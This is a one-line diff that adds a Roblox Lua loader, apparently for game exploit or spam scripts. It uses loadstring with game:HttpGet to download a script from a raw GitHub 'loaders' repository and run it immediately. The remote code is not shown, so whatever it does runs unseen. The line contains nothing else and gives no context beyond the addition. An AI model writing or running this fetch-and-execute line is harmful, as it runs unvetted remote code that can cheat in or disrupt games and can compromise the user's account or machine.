@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/update-bathtub-universe-spam3-me3r1f5mo7ca0x.lua"))()
